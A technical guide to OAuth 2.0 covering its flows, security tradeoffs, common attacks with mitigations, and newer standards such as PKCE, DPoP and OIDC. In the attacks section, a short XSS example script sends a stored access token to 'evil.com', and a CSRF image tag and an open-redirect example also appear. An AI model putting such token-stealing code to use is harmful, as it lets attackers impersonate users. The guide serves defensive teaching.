# OAuth 2.0: Complete Technical Guide

## Table of Contents
1. [What is OAuth 2.0?](#what-is-oauth-20)
2. [Core Concepts](#core-concepts)
3. [OAuth 2.0 Flows](#oauth-20-flows)
4. [Security Tradeoffs](#security-tradeoffs)
5. [Common Attacks](#common-attacks)
6. [Protections & Mitigations](#protections--mitigations)
7. [Modern System Improvements](#modern-system-improvements)

---

## What is OAuth 2.0?

OAuth 2.0 is an **authorization framework** (not authentication) that allows users to grant third-party applications access to their resources on a resource server **without sharing passwords directly**. It's the industry standard for delegated access.

### Key Problem It Solves
- **Before OAuth**: Apps asked for your password → dangerous, inflexible, insecure
- **After OAuth**: Apps get limited tokens → safe, auditable, revocable

### Real-World Example
When you click "Sign in with Google" on a website, you're using OAuth 2.0. Your browser redirects to Google, you authenticate, Google gives the website a token, and the website uses that token to access your Google data—without ever seeing your Google password.

---

## Core Concepts

### The Four Key Players

| Player | Role |
|--------|------|
| **Resource Owner** | You (the user who owns the data) |
| **Client** | The app requesting access (e.g., Spotify desktop app) |
| **Authorization Server** | Authenticates you and issues tokens (e.g., Google accounts) |
| **Resource Server** | Holds your data and validates tokens (e.g., Google Drive) |

### Key Terminology

- **Access Token**: A credential proving the client has authorization to access resources (short-lived, typically 1-24 hours)
- **Refresh Token**: A long-lived credential to get new access tokens without user re-authentication
- **Scope**: Permissions (e.g., `read:email`, `write:photos`)
- **Authorization Code**: Temporary code exchanged for access tokens (single-use)
- **Grant Type**: Different mechanisms for obtaining tokens

---

## OAuth 2.0 Flows

### 1. Authorization Code Flow (Most Common & Secure)

**Used for**: Web apps, desktop apps, mobile apps

**Diagram**:
```
1. User clicks "Login with Google"
        ↓
2. App redirects to: 
   https://google.com/auth?client_id=X&redirect_uri=Y&scope=Z
        ↓
3. User logs in and grants permission
        ↓
4. Google redirects to app with: 
   https://app.com/callback?code=AUTH_CODE
        ↓
5. App backend exchanges code for token (secure, server-to-server)
        ↓
6. App receives access_token and refresh_token
        ↓
7. App uses access_token to call resource server
```

**Why it's secure**:
- Authorization code is short-lived (10 minutes typically)
- Token exchange happens server-to-server (client secret involved)
- Tokens never exposed in URL (unlike implicit flow)

**Code Example**:
```
Step 1: Authorization Request
GET https://accounts.google.com/o/oauth2/v2/auth?
  client_id=CLIENT_ID
  &redirect_uri=https://app.com/callback
  &response_type=code
  &scope=openid email profile

Step 5: Token Exchange (server-to-server)
POST https://oauth2.googleapis.com/token
  client_id=CLIENT_ID
  &client_secret=CLIENT_SECRET
  &code=AUTH_CODE
  &grant_type=authorization_code
  &redirect_uri=https://app.com/callback

Response:
{
  "access_token": "ya29.a0AfH...",
  "refresh_token": "1//0gQ...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

---

### 2. Implicit Flow (Legacy - NOT Recommended)

**Used for**: Single-page applications (SPAs) - **deprecated, use PKCE instead**

**Problem**: Access token exposed in URL
```
https://app.com/callback#access_token=TOKEN&expires_in=3600
```
Any script, logs, or browser history could expose the token.

---

### 3. Resource Owner Password Credentials Flow

**Used for**: Legacy apps, CLI tools, highly trusted clients

```
POST /token
  grant_type=password
  &username=user@example.com
  &password=PASSWORD
  &client_id=CLIENT_ID
  &client_secret=CLIENT_SECRET

Response: {access_token, refresh_token, ...}
```

**Problem**: App sees user's password—only acceptable for first-party apps

---

### 4. Client Credentials Flow

**Used for**: Server-to-server authorization (no user involved)

```
POST /token
  grant_type=client_credentials
  &client_id=CLIENT_ID
  &client_secret=CLIENT_SECRET
  &scope=write:data

Response: {access_token, ...}
```

**Example**: Your backend calling Stripe API to process payments

---

### 5. Authorization Code Flow with PKCE (Modern Standard)

**Used for**: Mobile apps, SPAs—**the secure modern replacement for implicit**

**PKCE** = Proof Key for Code Exchange

**Flow**:
```
1. App generates random string (code_verifier)
   code_verifier = "abcdefghijklmnopqrstuvwxyz123456789..."

2. App hashes it (code_challenge)
   code_challenge = SHA256(code_verifier) base64-encoded

3. App redirects to auth server:
   GET /auth?client_id=X&code_challenge=CHALLENGE&code_challenge_method=S256

4. User grants permission

5. Auth server returns code (no token in URL)
   https://app.com/callback?code=AUTH_CODE

6. App exchanges code + code_verifier:
   POST /token
     client_id=X
     &code=AUTH_CODE
     &code_verifier=VERIFIER
     &grant_type=authorization_code

7. Auth server verifies: SHA256(code_verifier) == code_challenge
   ✓ Match → Issue access_token
   ✗ No match → Reject
```

**Why PKCE is secure**:
- If authorization code is intercepted, attacker can't use it without `code_verifier`
- Even if app is compromised (XSS), attacker only gets the code, not the verifier
- Protects against malicious apps and intercepted codes

---

## Security Tradeoffs

### Tradeoff 1: User Experience vs. Security

| Approach | Experience | Security |
|----------|-----------|----------|
| **OAuth + PKCE** | Requires redirect/redirect back | ★★★★★ Excellent |
| **Username/Password** | Single page login | ★★☆☆☆ Poor (password reuse) |
| **Magic Links** | Email verification | ★★★☆☆ Good (no password) |
| **Passwordless (FIDO2)** | Phone/hardware key tap | ★★★★★ Excellent |

**Tradeoff**: PKCE requires user interaction; password is one-click but less secure.

---

### Tradeoff 2: Token Lifetime vs. Security Exposure

```
Short-lived tokens (15 min):
  + If token stolen, limited exposure window
  - Requires frequent refresh token requests
  - More server load
  - More user interruptions

Long-lived tokens (1 week):
  + Less refresh overhead
  + Smoother user experience
  - Large exposure window if stolen
  - User can't quickly revoke access
```

**Best Practice**: Short access tokens (15-60 min) + refresh token mechanism

---

### Tradeoff 3: Scope Granularity vs. Simplicity

```
Fine-grained scopes:
  read:emails, write:photos, delete:data
  + User can grant specific permissions
  - Complex permission dialogs
  - Harder for developers

Broad scopes:
  profile, data
  + Simple dialogs
  - User grants excessive permissions
```

---

### Tradeoff 4: Stateless vs. Stateful Sessions

```
Stateless (JWT tokens):
  + No database lookup needed
  + Scales easily
  - Can't revoke instantly (token valid until expiry)

Stateful (session tokens):
  + Can revoke immediately
  - Requires database lookup per request
  - Doesn't scale as well
```

---

## Common Attacks

### 1. **Authorization Code Interception**

**Attack**: Network sniffer intercepts the authorization code from redirect URL

```
https://app.com/callback?code=INTERCEPTED_CODE
```

**Impact**: Attacker can exchange code for access token (if they have client_secret)

**Prevention**:
- ✓ Use HTTPS only
- ✓ Use PKCE (code_verifier required for token exchange)
- ✓ Validate redirect_uri strictly on server-side

---

### 2. **Open Redirect**

**Attack**: Redirect URI validation is loose

```
Attacker registers: https://app.com/callback?next=https://evil.com
Authorization server redirects to: https://evil.com with code in URL
Attacker's evil site captures the code
```

**Prevention**:
- ✓ Whitelist redirect URIs (exact string match)
- ✓ No dynamic `next` parameter in redirect_uri
- ✓ Validate against registered URIs only

---

### 3. **Token Theft (XSS in SPA)**

**Attack**: Malicious JavaScript steals access token from localStorage

```javascript
// Malicious script injected via XSS
fetch('https://evil.com/steal', {
  method: 'POST',
  body: localStorage.getItem('access_token')
})
```

**Impact**: Attacker has token, can impersonate user

**Prevention**:
- ✓ Store tokens in memory (not localStorage/sessionStorage)
- ✓ Use HttpOnly cookies (inaccessible to JS)
- ✓ Implement Content Security Policy (CSP)
- ✓ Use PKCE to limit damage even if code is stolen

---

### 4. **Token Replay**

**Attack**: Attacker replays captured access token on different device

```
1. Attacker steals token from network
2. Uses it multiple times: GET /api/user?token=STOLEN_TOKEN
```

**Prevention**:
- ✓ Use HTTPS (encrypt tokens in transit)
- ✓ Validate token source (issuer, audience, scope)
- ✓ Bind tokens to device/IP (can cause issues with proxies)
- ✓ Use short token lifetimes

---

### 5. **Refresh Token Theft**

**Attack**: Refresh token stolen from storage/network

```
Refresh token is long-lived. If stolen:
  Attacker can get new access tokens indefinitely
  User has no idea their account is compromised
```

**Prevention**:
- ✓ Store refresh tokens in HttpOnly secure cookies (not localStorage)
- ✓ Implement refresh token rotation (issue new refresh token with each use)
- ✓ Bind refresh tokens to device fingerprint
- ✓ Implement abuse detection (unusual refresh patterns)

---

### 6. **CSRF (Cross-Site Request Forgery)**

**Attack**: Attacker tricks user into authorizing the wrong app

```html
<!-- Evil website -->
<img src="https://auth.google.com/oauth/authorize?client_id=ATTACKER_CLIENT_ID">
<!-- User's browser automatically includes session cookies -->
<!-- Attacker's app gets authorized -->
```

**Prevention**:
- ✓ Use `state` parameter (random string)
  - App includes `state=RANDOM` in auth request
  - Auth server returns `state` in redirect
  - App verifies `state` matches
- ✓ Use SameSite cookie attribute

```
GET /auth?client_id=X&state=RANDOM_XYZ

Redirect with state verification:
GET https://app.com/callback?code=AUTH_CODE&state=RANDOM_XYZ
// App checks: state matches what was sent ✓
```

---

### 7. **Man-in-the-Middle (MITM)**

**Attack**: Attacker intercepts authorization code or token

```
Victim --- [ATTACKER] --- Authorization Server
                ↓
            Intercepts code/token
```

**Prevention**:
- ✓ HTTPS with certificate pinning (mobile apps)
- ✓ Use PKCE (makes intercepted code useless)
- ✓ Validate certificate chains
- ✓ Use token binding (device-specific tokens)

---

### 8. **Phishing**

**Attack**: Attacker creates fake login page mimicking real OAuth provider

```
User clicks "Login with Google"
  ↓
Lands on attacker's fake Google login page
  ↓
Enters credentials
  ↓
Attacker gets credentials
```

**Prevention**:
- ✓ Use official OAuth libraries
- ✓ Validate auth server URL/certificate
- ✓ Users should verify domain matches
- ✓ Multi-factor authentication

---

### 9. **Scope Creep**

**Attack**: App requests more permissions than needed

```
App says: "I need access to your photos"
User clicks approve
App actually: "I now have access to write emails, read contacts, etc."
```

**Prevention**:
- ✓ Request minimal scopes (`email` not `profile`)
- ✓ Request new scopes only when needed (incremental consent)
- ✓ Users review requested scopes before approving
- ✓ Auth server should validate scope requests

---

### 10. **Insecure Token Storage in Native Apps**

**Attack**: App stores token in plaintext, device is compromised

```
Token stored: /shared_prefs/oauth_token.txt (Android)
Device rooted by malware → token stolen
```

**Prevention**:
- ✓ Use OS-provided secure storage (Keychain on iOS, Keystore on Android)
- ✓ Encrypt tokens at rest
- ✓ Use biometric authentication before token use
- ✓ Implement certificate pinning

---

## Protections & Mitigations

### 1. **State Parameter** (Anti-CSRF)

```javascript
// Client generates random state
const state = generateRandomString(32);
sessionStorage.setItem('oauth_state', state);

// Redirect to auth server with state
window.location = `https://auth.server.com/authorize?
  client_id=${CLIENT_ID}&
  redirect_uri=${REDIRECT_URI}&
  state=${state}&
  response_type=code`;

// In callback handler
function handleCallback() {
  const state = getQueryParam('state');
  const storedState = sessionStorage.getItem('oauth_state');
  
  if (state !== storedState) {
    throw new Error('CSRF detected!');
  }
}
```

---

### 2. **PKCE** (Anti-Code Interception)

```javascript
// Generate PKCE parameters
const codeVerifier = generateRandomString(128);
const codeChallenge = base64url(sha256(codeVerifier));

// Auth request includes challenge
window.location = `https://auth.server.com/authorize?
  client_id=${CLIENT_ID}&
  code_challenge=${codeChallenge}&
  code_challenge_method=S256&
  state=${state}`;

// Token exchange includes verifier (unguessable)
const response = await fetch('https://auth.server.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authCode,
    code_verifier: codeVerifier, // Only client knows this
    client_id: CLIENT_ID
  })
});
```

---

### 3. **HttpOnly, Secure Cookies**

```
Set-Cookie: refresh_token=abc123def456; 
  HttpOnly;           // ← Inaccessible to JavaScript (prevents XSS)
  Secure;             // ← Sent only over HTTPS
  SameSite=Strict;    // ← Prevents CSRF
  Max-Age=604800;     // ← 7 days
  Domain=.app.com;    // ← Only sent to app.com
  Path=/api;          // ← Only sent to /api/*
```

---

### 4. **Content Security Policy (CSP)**

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.app.com;
  frame-ancestors 'none';
">
```

Prevents:
- Inline scripts (mitigates XSS)
- External script injection
- Clickjacking

---

### 5. **Token Rotation**

```
Initial request:
  POST /token → 
    access_token: "token1", 
    refresh_token: "refresh1"

User makes API call with access_token

After 1 hour (token expires):
  POST /refresh_token?token=refresh1 → 
    access_token: "token2",
    refresh_token: "refresh2"  // ← NEW refresh token issued
    
Previous refresh_token is invalidated
If attacker replays old refresh_token → Rejection detected!
```

---

### 6. **Proof of Possession (PoP)**

Modern standard (DPoP - Demonstration of Proof-of-Possession):

```
Client creates signature with private key for each request:

GET /api/user
  Authorization: DPoP eyJhbGc...  // Regular OAuth token
  DPoP: eyJhbGciOiJSUzI1NiIs...   // Proof token

Auth server verifies:
  ✓ DPoP proof is signed with specific client's key
  ✓ Proof is fresh (timestamp within 1 minute)
  ✓ Proof binds to this HTTP request (method, URL, timestamp)
  
If attacker replays token without proof → Rejected!
```

---

### 7. **Mutual TLS (mTLS)**

For server-to-server OAuth (client credentials):

```
Client certificate validates client
Server certificate validates server

Both parties authenticate each other cryptographically
Token can only be used from authenticated client's IP/certificate
```

---

### 8. **Rate Limiting & Anomaly Detection**

```
Detected anomalies:
  - Refresh token used 10x in 1 minute (normal: ~1x/hour)
  - Access token used from 3 different countries in 5 minutes
  - Scope escalation (started with read, now requesting delete)
  
Action: Lock account, require re-authentication
```

---

### 9. **Monitoring & Logging**

```
Log all OAuth events:
  - Authorization requests (unusual scopes?)
  - Token issuance (unusual client?)
  - Token refresh (high frequency?)
  - Failed authentication attempts
  - Token validation failures

Alert on:
  - 5+ failed auth attempts from same IP
  - Tokens used from impossible locations
  - Sudden spike in refresh token requests
  - Access to high-risk scopes
```

---

### 10. **User Education**

- Verify login domain
- Check requested permissions
- Review connected apps periodically
- Revoke access to unused apps

---

## Modern System Improvements

### 1. **OAuth 2.0 Security Best Practices (BCP)**

IETF formally updated OAuth 2.0 recommendations:

| Old | New |
|-----|-----|
| Implicit flow OK | ❌ PKCE required for all public clients |
| Resource owner password OK | ❌ Avoid except legacy |
| No state required | ✓ State mandatory for CSRF |
| Tokens in URL | ✓ Tokens only in response body |
| Long token lifetime | ✓ Short access tokens (minutes) + refresh tokens |

---

### 2. **OAuth 2.1** (Draft Standard)

The next evolution, incorporating modern security:

```
Key changes:
  - Authorization code flow + PKCE is the standard (not optional)
  - Implicit flow removed entirely
  - Resource owner password flow removed
  - Refresh token rotation mandatory
  - Refresh token expiration recommended
  - Sender-constrained tokens (PoP) required
  - HTTPS mandatory (no http)
```

---

### 3. **OpenID Connect (OIDC)**

Built on top of OAuth 2.0 for **authentication** (not just authorization):

```
OAuth 2.0: "Gives app permission to access your Gmail"
OIDC: "Proves who you are to the app"

OIDC adds:
  - ID token (JWT with identity info)
  - UserInfo endpoint
  - Standardized claims (sub, email, name, etc.)

Flow:
  GET /authorize?scope=openid email profile
  
Response includes:
  {
    access_token: "...",
    id_token: "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.
               eyJpc3MiOiJodHRwczovL2V4YW1wbGUuY29tIiwic3ViIjoiMjQ4OTg5MDEyMzQiLCJhdWQiOiJjbGllbnRfaWQiLCJub25jZSI6ImFiY2QifQ.
               signature",
    refresh_token: "..."
  }

ID Token decoded:
  {
    "iss": "https://example.com",      // Issuer
    "sub": "248989012345",              // Subject (user ID)
    "aud": "client_id",                 // Audience
    "nonce": "abcd",                    // Prevents replay
    "iat": 1311280970,                  // Issued at
    "exp": 1311284570,                  // Expires
    "email": "user@example.com",
    "email_verified": true,
    "name": "John Doe"
  }
```

**Why OIDC is better**:
- Standardized identity claims
- ID token validates issuer cryptographically
- Nonce prevents token reuse
- Aligns with modern security practices

---

### 4. **Token Binding & DPoP (Demonstration of Proof-of-Possession)**

**Problem**: Stolen token can be used from anywhere

**Solution**: Bind token to client's public key

```
Client generates key pair:
  Private key: kept secret
  Public key: sent to auth server with token

Client's every request includes proof (signature):
  Authorization: Bearer {access_token}
  DPoP: {JWS proof}

Server verifies:
  ✓ Token is valid
  ✓ DPoP proof is recent (< 1 min)
  ✓ DPoP proof is signed with the public key we have
  ✓ DPoP proof covers this request (method, URL, timestamp)

If attacker steals token:
  - Can't replay it without the private key
  - Proof is unique per request (can't be reused)
  - Proof expires in 1 minute
```

---

### 5. **Device Flow (OAuth 2.0 for IoT)**

For devices without browsers (smart TVs, printers):

```
1. Device displays: "Go to https://auth.example.com?code=ABC123"
2. User enters code on browser
3. Browser authenticates and approves
4. Device polls auth server: "Does code ABC123 have approval?"
5. Auth server returns: access_token

Advantages:
  - No sensitive data on device itself
  - User authenticates on secure device (phone/computer)
  - Device never sees user's password
```

---

### 6. **Authorization Server as a Service**

Modern companies use specialized providers:

| Provider | Strengths |
|----------|-----------|
| **Auth0** | Multi-protocol support, easy integration |
| **Okta** | Enterprise-grade, compliance (HIPAA, SOC2) |
| **AWS Cognito** | AWS ecosystem, scales automatically |
| **Google Identity** | Standards-compliant, battle-tested |
| **Microsoft Azure AD** | Enterprise directory integration |

Benefits:
- Outsource security complexity
- Regular security updates
- Multi-factor authentication built-in
- Compliance reporting
- Passwordless authentication options

---

### 7. **Passwordless Authentication**

Modern OAuth + passwordless mechanisms:

```
FIDO2/WebAuthn flow:
  1. User clicks "Sign in"
  2. Browser prompts biometric or hardware key
  3. Device proves identity cryptographically
  4. OAuth flow continues with proof of identity
  
Advantages:
  - No password to steal/phish
  - Phishing-resistant (cryptographic proof)
  - Fast (no typing required)
  - Works across devices
```

---

### 8. **Consent & Transparency Improvements**

Modern UX:

```
Instead of generic "Approve?", show:
  
  ┌─────────────────────────────────────────┐
  │ Login to Spotify                        │
  │                                         │
  │ Google will share:                      │
  │  ✓ Your email (user@gmail.com)         │
  │  ✓ Your profile name (John Doe)        │
  │  ✓ Your profile picture                │
  │                                         │
  │ Spotify will:                           │
  │  • Read your saved playlists           │
  │  • Create new playlists for you        │
  │  • NOT: Access your contacts           │
  │  • NOT: Read your Gmail                │
  │                                         │
  │ Permissions expire in 30 days           │
  │ [Deny]         [Approve]               │
  └─────────────────────────────────────────┘
```

---

### 9. **Incremental Consent**

Instead of requesting all permissions upfront:

```
First login:
  Scope: openid email
  (Basic login functionality)

When user tries to access photos:
  Scope: photos.read
  (Just-in-time consent)

When user tries to backup:
  Scope: photos.write
  (Minimal permission elevation)

Benefits:
  - Users see why each permission is needed
  - Less likely to reject ("why do you need my photos?")
  - Better security (principle of least privilege)
```

---

### 10. **Risk-Based Authentication**

Modern auth servers adapt security based on risk:

```
Low-risk scenario (normal patterns):
  Known device + Known location → Simple login
  
Medium-risk scenario (unusual patterns):
  New device → Require email verification
  
High-risk scenario (detected attack):
  Impossible travel → Require SMS + security questions
  Many failed attempts → Temporarily block account
  Unusual scope request → Enhanced verification
```

---

### 11. **Decentralized Identity (Future)**

Emerging approach using blockchain/cryptography:

```
User owns their credentials (not stored on auth server)
Can prove identity without centralized authority
Attributes proven cryptographically

Example: Zero-Knowledge Proof
  Auth server: "Prove you're over 18"
  User: "I prove it with this ZK proof"
    (doesn't reveal birth date, just proves condition)
```

---

### 12. **Continuous Authentication**

Rather than single login event:

```
Traditional:
  Login → Token expires in 1 hour → Re-login required

Modern continuous:
  Monitor user behavior constantly:
    - Device patterns
    - Typing speed
    - Mouse movements
    - Time of day
    - Geolocation patterns
  
  If behavior anomaly detected:
    → Require re-authentication
    → Increase token expiration gradually
    → Lock sensitive operations
```

---

## Summary Table: OAuth 2.0 Evolution

| Aspect | Old | Modern | Future |
|--------|-----|--------|--------|
| **Flow** | Implicit | Code + PKCE | OAuth 2.1 + DPoP |
| **Authentication** | Password | OAuth + OIDC | Passwordless + FIDO2 |
| **Token Storage** | localStorage | HttpOnly cookies | Hardware keys |
| **Token Lifetime** | Long (weeks) | Short (minutes) | Per-request PoP |
| **Revocation** | Difficult | Refresh token rotation | Real-time |
| **Privacy** | Consent forms | Granular + transparent | Zero-knowledge proofs |
| **Infrastructure** | DIY | Auth0/Okta/Cognito | Decentralized identity |
| **Risk Adaptation** | No | Risk-based auth | Continuous auth |

---

## Quick Security Checklist for Developers

### When Building an OAuth Provider:
- [ ] Validate redirect_uri strictly (exact match, whitelist)
- [ ] Implement PKCE support (not optional)
- [ ] Use short authorization code lifetime (10 min)
- [ ] Sign tokens (JWT with RS256)
- [ ] Implement rate limiting (prevent brute force)
- [ ] Log all auth events
- [ ] Support token revocation
- [ ] Implement refresh token rotation
- [ ] Validate audience (aud claim in JWT)
- [ ] Use HTTPS everywhere

### When Building an OAuth Client:
- [ ] Use authorization code flow + PKCE
- [ ] Validate state parameter
- [ ] Store tokens in HttpOnly secure cookies
- [ ] Implement token refresh logic
- [ ] Validate token signature (if JWT)
- [ ] Implement certificate pinning (mobile)
- [ ] Use Content Security Policy
- [ ] Implement CSRF protection
- [ ] Regular security updates
- [ ] Monitor for token theft

---

## Conclusion

OAuth 2.0 remains the industry standard for delegated access. Modern systems improve security through:

1. **Mandatory PKCE** for public clients
2. **Token binding (DPoP)** preventing token theft
3. **Refresh token rotation** for rapid revocation
4. **Passwordless authentication** eliminating phishing
5. **Risk-based authentication** adapting security dynamically
6. **Transparency improvements** in user consent
7. **Specialized providers** reducing security burden
8. **Continuous monitoring** of anomalies

By understanding these flows, attacks, and protections, developers can build secure authentication systems that balance user experience with security.

---

## References

- [RFC 6749: OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
- [RFC 7636: PKCE](https://tools.ietf.org/html/rfc7636)
- [IETF OAuth 2.0 Security Best Practices](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [DPoP (Demonstration of Proof-of-Possession)](https://tools.ietf.org/html/draft-ietf-oauth-dpop)
